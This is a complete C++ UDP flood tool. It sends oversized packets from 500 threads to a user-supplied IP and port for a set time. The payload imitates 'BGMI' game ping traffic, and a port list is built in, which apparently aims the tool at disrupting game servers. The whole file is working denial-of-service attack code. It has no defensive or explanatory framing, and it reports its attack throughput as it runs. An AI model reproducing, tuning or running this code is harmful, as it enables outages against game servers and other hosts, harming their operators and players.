#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <mutex>
#include <random>

#define PACKET_SIZE 16384 // Larger packets
#define MAX_PACKETS_PER_SEC 500000 // Higher rate
#define NUM_THREADS 500 // More threads

class UdpFlooder {
private:
    std::string target_ip;
    int target_port;
    int duration;
    unsigned long packets_sent;
    std::mutex mtx;

    int create_socket() {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) {
            std::cerr << "Socket creation failed: " << strerror(errno) << std::endl;
            return -1;
        }
        int sendbuf = 64 * 1024 * 1024; // 64MB send buffer
        if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf)) < 0) {
            std::cerr << "Warning: Failed to set send buffer size: " << strerror(errno) << std::endl;
        }
        return sock;
    }

    std::string generate_random_name() {
        static const std::string letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, letters.size() - 1);
        std::string name(10, ' ');
        for (int i = 0; i < 10; ++i) {
            name[i] = letters[dis(gen)];
        }
        return name;
    }

    void flood_thread() {
        int sock = create_socket();
        if (sock < 0) return;

        struct sockaddr_in target = {0};
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target.sin_addr);

        char packet[PACKET_SIZE];
        memset(packet, 'X', PACKET_SIZE - 1);
        packet[PACKET_SIZE - 1] = '\0';

        auto start_time = std::chrono::steady_clock::now();
        while (true) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (elapsed >= duration) break;

            for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; ++i) {
                std::string name = generate_random_name();
                const unsigned char header[] = {0xFF, 0xFF, 0xFF, 0xFF};
                snprintf(packet, PACKET_SIZE, "%.*sBGMI:Player:%s:Ping:%d", 
                         4, (const char*)header, name.c_str(), rand() % 1000);
                
                ssize_t sent = sendto(sock, packet, PACKET_SIZE - 1, 0,
                                     (struct sockaddr*)&target, sizeof(target));
                if (sent > 0) {
                    std::lock_guard<std::mutex> lock(mtx);
                    packets_sent++;
                }
            }
            std::this_thread::sleep_for(std::chrono::microseconds(1));
        }
        close(sock);
    }

public:
    UdpFlooder(const std::string& ip, int port, int dur) 
        : target_ip(ip), target_port(port), duration(dur), packets_sent(0) {}

    void start_flood() {
        std::vector<std::thread> threads;
        for (int i = 0; i < NUM_THREADS; ++i) {
            threads.emplace_back(&UdpFlooder::flood_thread, this);
        }

        auto start_time = std::chrono::steady_clock::now();
        while (true) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (elapsed >= duration) break;
            {
                std::lock_guard<std::mutex> lock(mtx);
                std::cout << "\rPackets sent: " << packets_sent 
                          << " (" << packets_sent / (elapsed + 1.0) << " packets/sec, "
                          << packets_sent * PACKET_SIZE * 8 / (elapsed + 1.0) / 1000000 << " Mbps)";
                std::cout.flush();
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        for (auto& t : threads) {
            t.join();
        }
        std::cout << "\nFlood completed. Total packets sent: " << packets_sent << std::endl;
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time>" << std::endl;
        return 1;
    }

    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);

    if (target_port <= 0 || target_port > 65535) {
        std::cerr << "Port must be between 1 and 65535" << std::endl;
        return 1;
    }
    if (duration <= 0) {
        std::cerr << "Duration must be positive" << std::endl;
        return 1;
    }

    int ignore_ports[] = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030};
    for (int i = 0; i < sizeof(ignore_ports) / sizeof(ignore_ports[0]); ++i) {
        if (target_port == ignore_ports[i]) {
            std::cerr << "Error: Port " << target_port << " is in the ignore list" << std::endl;
            return 1;
        }
    }

    std::cout << "Starting UDP flood on " << target_ip << ":" << target_port 
              << " for " << duration << " seconds with " << NUM_THREADS << " threads" << std::endl;

    UdpFlooder flooder(target_ip, target_port, duration);
    flooder.start_flood();

    return 0;
}